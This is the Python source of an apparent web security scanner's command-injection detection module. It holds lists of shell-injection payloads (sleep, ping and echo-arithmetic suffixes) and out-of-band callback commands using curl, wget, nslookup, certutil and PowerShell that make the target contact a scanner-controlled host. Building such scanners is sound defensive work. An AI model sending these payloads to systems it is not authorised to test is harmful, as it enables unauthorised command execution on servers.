"""
CommandInjectionModule — OS command injection detection.

The README has always advertised "Command Injection" as a detected class,
but no module actually implemented it. This does, and it holds the same
near-zero-false-positive bar as the rest of the engine by only ever
reporting on PROOF, never on a reflected string:

  1. OOB (blind) — inject a shell command that makes an outbound callback
     (`curl`/`wget`/`nslookup`/`certutil`) to an interactsh domain we
     control. A correlated DNS/HTTP hit = the command definitely executed.
     This is the strongest signal and the only one that catches fully-blind
     injection (no output reflected anywhere). Reuses core/oast.py.
  2. Time-based — inject `sleep N` / `ping -n N` and confirm a statistically
     significant, reproducible delay via Validator.validate_time_based
     (Z-score ≥ 3.5, control recovery, re-confirmation) — the same rigor
     SQLi time-based uses. A cheap single pre-probe gates the expensive
     statistical confirmation so dead params don't pay for it.
  3. In-band arithmetic marker — inject `echo <m>$((A*B))<m>` with random
     operands wrapped in a unique marker, and require the PRODUCT to appear
     between the markers while the literal `$((A*B))` expression is gone —
     proving the shell evaluated it (the same marker discipline SSTI uses),
     not that the payload was merely reflected.

Injection surfaces: GET query params (crawled + command-ish name guesses),
HTML form fields, JSON body props, and URL path segments (OpenAPI spec).
"""
import random
import string
import time
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from recon.core.validator import Validator
from recon.modules import BaseModule


# Params whose names suggest they feed a shell/exec sink (ping tools, DNS
# lookups, file converters, "run this" admin features, …).
CMDI_PARAM_HINTS = [
    "cmd", "command", "exec", "execute", "run", "ping", "host", "hostname",
    "ip", "addr", "address", "domain", "dns", "lookup", "query", "target",
    "url", "uri", "path", "file", "filename", "name", "action", "func",
    "option", "arg", "args", "data", "input", "feed", "load", "do", "script",
]

DELAY = 6  # seconds for the time-based probe

# (payload_suffix_template, os) — appended AFTER the param's original value so
# a leading value that the shell needs (e.g. an IP for `ping`) is preserved.
TIME_PAYLOADS = [
    ("; sleep {n}",              "unix"),
    ("| sleep {n}",              "unix"),
    ("$(sleep {n})",             "unix"),
    ("`sleep {n}`",              "unix"),
    ("; sleep {n} #",            "unix"),
    ("\" ; sleep {n} ; \"",      "unix"),
    ("' ; sleep {n} ; '",        "unix"),
    ("& ping -n {n1} 127.0.0.1 &",   "windows"),
    ("| ping -n {n1} 127.0.0.1",     "windows"),
    ("& timeout /t {n} /nobreak &",  "windows"),
]

# OOB callback payloads — {u} = full http URL, {h} = bare host (for nslookup).
OOB_PAYLOADS = [
    "; curl {u}",
    "| curl {u}",
    "$(curl {u})",
    "`curl {u}`",
    "; wget -qO- {u}",
    "; nslookup {h}",
    "| nslookup {h}",
    "& nslookup {h} &",
    "& certutil -urlcache -f {u} x &",
    '& powershell -c "iwr {u}" &',
]


class CommandInjectionModule(BaseModule):
    NAME = "Command Injection"

    MAX_GUESS_ENDPOINTS = 10   # cap guessed-name spray
    MAX_POINTS = 40            # overall worklist cap
    MAX_OOB_POINTS = 20        # OOB spray cap (each shares one wait window)

    def __init__(self, target, db, ui, context, timeout=12, delay=0.3,
                 threads=6, verbose=False, ai=None, output_dir=None):
        super().__init__(target, db, ui, context, timeout, delay, threads, verbose, ai, output_dir)
        self.session = self._session()
        self.validator = Validator(baseline=self.ctx.get("baseline_profile"), ai=self.ai, ui=self.ui)
        self._found_lock = threading.Lock()
        self._found = 0

    # ──────────────────────────────────────────────────────────────────────
    def run(self):
        self.ui.section("Command Injection — OS Command Execution Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        points = self._collect_points()
        self.ui.info(f"Testing {len(points)} injection point(s) for OS command injection "
                     f"(in-band + time-based, {self.threads} workers)")

        with ThreadPoolExecutor(max_workers=max(1, min(self.threads, len(points) or 1))) as ex:
            futures = [ex.submit(self._test_point, p) for p in points]
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    if self.verbose:
                        self.ui.error(f"CMDi thread error: {e}")

        # Blind/OOB confirmation phase (one shared interactsh wait window).
        self._test_oob(points)

        if self._found == 0:
            self.ui.info("No command injection vulnerabilities detected.")
        else:
            self.ui.ok(f"Command injection scan complete — {self._found} confirmed finding(s)")

    # ──────────────────────────────────────────────────────────────────────
    def _collect_points(self):
        """Unified injection-point worklist: {url|url_template, method, param,
        param_type, original_value, other_params, headers}. Prioritises real
        params; sprays command-ish name guesses across a capped set of
        query-less endpoints."""
        points, seen = [], set()
        auth_headers = self.ctx.get("auth_headers", {})

        def add(url, method, param, ptype, orig, other, headers, extra=None):
            key = (url.split("#", 1)[0], param, ptype)
            if key in seen or len(points) >= self.MAX_POINTS:
                return
            seen.add(key)
            p = {"url": url, "method": method, "param": param, "param_type": ptype,
                 "original_value": orig, "other_params": other, "headers": headers}
            if extra:
                p.update(extra)
            points.append(p)

        endpoints = [self.base_url] + self.ctx.get("endpoints", [])
        guess_budget = []
        for ep in endpoints:
            try:
                parsed = urllib.parse.urlparse(ep)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            except Exception:
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            if qs:
                for param, vals in qs.items():
                    add(base, "GET", param, "query", vals[0] if vals else "1",
                        {k: v[0] for k, v in qs.items() if k != param}, {})
            else:
                guess_budget.append(base)

        # params.py discoveries
        for entry in self.ctx.get("discovered_params", []):
            if isinstance(entry, (tuple, list)) and len(entry) == 2:
                add(entry[0], "GET", entry[1], "query", "1", {}, {})

        # Guessed command-ish names on a capped set of query-less endpoints.
        for ep in guess_budget[: self.MAX_GUESS_ENDPOINTS]:
            for param in CMDI_PARAM_HINTS:
                add(ep, "GET", param, "query", "127.0.0.1", {}, {})

        # HTML form fields
        for form in self.ctx.get("forms", []):
            furl = form.get("action", self.base_url)
            method = form.get("method", "POST").upper()
            for inp in form.get("inputs", {}).keys():
                add(furl, method, inp, "form", "1",
                    {k: v for k, v in form.get("inputs", {}).items() if k != inp}, {})

        # OpenAPI/Swagger JSON body props + path params (hinted)
        for api_ep in self.ctx.get("api_endpoints", []):
            method = api_ep.get("method", "POST")
            headers = dict(auth_headers)
            for name, example in api_ep.get("header_params", []):
                if example:
                    headers[name] = str(example)
            url = api_ep.get("url", "")
            for prop in api_ep.get("json_props", []):
                if any(h in prop.lower() for h in CMDI_PARAM_HINTS):
                    add(url, method, prop, "json", "test",
                        {p: "test" for p in api_ep.get("json_props", []) if p != prop}, headers)
            path_params = api_ep.get("path_params", [])
            for pname, pex in path_params:
                if any(h in pname.lower() for h in CMDI_PARAM_HINTS):
                    tmpl = url
                    for other, oex in path_params:
                        if other != pname:
                            tmpl = tmpl.replace("{" + other + "}", str(oex) if oex else "1")
                    add(url, method, pname, "path", str(pex) if pex else "1", {}, headers,
                        extra={"url_template": tmpl})

        return points

    # ──────────────────────────────────────────────────────────────────────
    def _send(self, point, value, timeout=None):
        """Deliver one probe value into the point. `value` is the FULL value to
        send (caller composes original_value + payload). Returns resp or None."""
        self._throttle()
        t = timeout or self.timeout
        method = point["method"]
        headers = {**self.auth_headers(), **(point.get("headers") or {})}
        cookies = self.auth_cookies()
        ptype = point["param_type"]
        try:
            if ptype in ("query", "form"):
                params = {**point.get("other_params", {}), point["param"]: value}
                if method == "GET":
                    return self.session.get(point["url"], params=params, timeout=t, headers=headers, cookies=cookies)
                return self.session.request(method, point["url"], data=params, timeout=t, headers=headers, cookies=cookies)
            if ptype == "json":
                body = {**point.get("other_params", {}), point["param"]: value}
                return self.session.request(method, point["url"], json=body, timeout=t, headers=headers, cookies=cookies)
            if ptype == "path":
                url = point["url_template"].replace("{" + point["param"] + "}", urllib.parse.quote(str(value), safe=""))
                return self.session.request(method, url, timeout=t, headers=headers, cookies=cookies)
        except RequestException:
            return None
        return None

    # ──────────────────────────────────────────────────────────────────────
    def _test_point(self, point):
        orig = point["original_value"] or ""
        # 1. In-band arithmetic marker (cheap: catches reflective-output cmdi).
        if self._inband(point, orig):
            return
        # 2. Time-based (expensive; gated by a quick pre-probe per payload).
        self._timebased(point, orig)

    def _inband(self, point, orig):
        a = random.randint(100, 999)
        b = random.randint(100, 999)
        product = str(a * b)
        marker = "gr" + "".join(random.choices(string.ascii_lowercase, k=6))
        payload = f"{orig}; echo {marker}$(({a}*{b})){marker}"
        resp = self._send(point, payload)
        if resp is None:
            return False
        text = resp.text or ""
        if f"{marker}{product}{marker}" in text and f"$(({a}*{b}))" not in text:
            self._report(point, payload, "In-band ($(...) arithmetic evaluated)",
                         f"Injected `echo {marker}$(({a}*{b})){marker}`; the shell evaluated the "
                         f"arithmetic to {product} between our unique markers (literal expression "
                         "absent from the response) — proving OS command execution, not reflection.",
                         ["arithmetic_evaluated_between_markers", "literal_expression_absent"], 95)
            return True
        return False

    def _timebased(self, point, orig):
        def send_fn(value, t):
            return self._send(point, value, timeout=t)

        # Quick, rough baseline (one request) so we only invoke the full
        # statistical confirmation on a payload that actually looks delayed.
        t0 = time.time()
        base_resp = self._send(point, orig or "1")
        base = time.time() - t0
        if base_resp is None:
            return

        for tmpl, osname in TIME_PAYLOADS:
            suffix = tmpl.format(n=DELAY, n1=DELAY + 1)
            full = f"{orig}{suffix}"
            t0 = time.time()
            r = self._send(point, full, timeout=self.timeout + DELAY + 6)
            dt = time.time() - t0
            if r is None:
                continue
            if dt < base + DELAY * 0.6:
                continue  # not delayed — skip the expensive confirmation

            # Looks delayed — confirm rigorously (Z-score, control, re-replay).
            result = self.validator.validate_time_based(
                url=point.get("url", ""), param=point["param"], delay_payload=full,
                expected_delay=DELAY, baseline_value=(orig or "1"),
                timeout=self.timeout, send_fn=send_fn,
            )
            if result.get("valid") and result.get("confidence_score", 0) >= 75:
                self._report(point, full, f"Time-based blind ({osname})",
                             f"Injecting a shell delay produced a statistically significant, "
                             f"reproducible server-side delay (Z={result.get('z_score', 0):.1f}, "
                             "control recovered). " + result.get("details", ""),
                             ["time_based_z_score", "control_recovery", "reconfirmed"], 95)
                return

    # ──────────────────────────────────────────────────────────────────────
    def _test_oob(self, points):
        from recon.core.oast import OASTClient

        oast = OASTClient(self.ui)
        if not oast.available:
            self.ui.info("interactsh-client not installed — skipping blind/OOB command-injection "
                         "confirmation (in-band + time-based checks above still ran).")
            return
        self.ui.info("Starting interactsh session for blind/OOB command-injection confirmation...")
        if not oast.start():
            self.ui.warn("Could not establish an interactsh session — skipping OOB command-injection confirmation.")
            return
        self.ui.ok(f"OOB session ready: *.{oast.domain}")

        probes = {}  # label -> point
        try:
            for point in points[: self.MAX_OOB_POINTS]:
                label, oob_url = oast.label_url()
                host = oob_url.split("://", 1)[-1].rstrip("/")
                orig = point["original_value"] or ""
                for tmpl in OOB_PAYLOADS:
                    payload = f"{orig}{tmpl.format(u=oob_url, h=host)}"
                    try:
                        self._send(point, payload)
                    except Exception:
                        pass
                probes[label] = point

            if not probes:
                return
            self.ui.info(f"Sent OOB probes across {len(probes)} point(s) — waiting for callbacks...")
            interactions = oast.poll(wait=15.0)
        finally:
            oast.stop()

        reported = set()
        for interaction in interactions:
            label = oast.interaction_label(interaction)
            if not label or label not in probes or label in reported:
                continue
            reported.add(label)
            point = probes[label]
            protocol = interaction.get("protocol", "dns/http")
            self._report(point, "(OOB callback payload)", f"Blind (OOB-confirmed, {protocol})",
                         "A shell command injected into this parameter made an outbound "
                         f"{protocol} request to an interactsh domain we control — an out-of-band "
                         "callback received directly, independent of the HTTP response. This proves "
                         "arbitrary OS command execution even when no output is reflected anywhere.",
                         ["oob_probe_sent", "interaction_received", "label_correlated"], 99,
                         severity="critical", confidence="CONFIRMED",
                         evidence_extra=[f"Protocol: {protocol}",
                                         f"Remote: {interaction.get('remote-address', interaction.get('remote_address', 'n/a'))}"])

    # ──────────────────────────────────────────────────────────────────────
    def _report(self, point, payload, technique, detail, steps, score,
                severity="critical", confidence="CONFIRMED", evidence_extra=None):
        param = point["param"]
        url = point.get("url") or point.get("url_template", "")
        loc = {"query": "GET parameter", "form": "form field", "json": "JSON body property",
               "path": "URL path segment"}.get(point["param_type"], "parameter")
        evidence = [f"Technique: {technique}", f"Payload: {payload}"] + (evidence_extra or [])
        added = self.db.add(
            title=f"OS Command Injection ({technique}) in '{param}' {loc}",
            severity=severity, url=url, module=self.NAME,
            description=(
                f"The '{param}' {loc} on {url} is vulnerable to OS command injection. {detail} "
                "An attacker can execute arbitrary operating-system commands on the server, "
                "typically leading to full host compromise."
            ),
            remediation=(
                "Never pass user input to a shell. Use parameterized process APIs that take an "
                "argument vector (e.g. subprocess with a list and shell=False, execve) instead of "
                "a shell string; validate against a strict allow-list; and run with least privilege."
            ),
            cvss="9.8", confidence=confidence, confidence_score=score,
            validation_steps=steps, evidence=evidence,
            references=[
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://portswigger.net/web-security/os-command-injection",
            ],
        )
        if added:
            with self._found_lock:
                self._found += 1
            self.ui.find(severity, f"Command Injection ({technique}) via '{param}'", url)
            self.ui.bullet(f"{loc.title()}: {param}  |  {technique}", indent=12)
            self.ctx.setdefault("cmdi_findings", []).append(
                {"url": url, "param": param, "technique": technique})
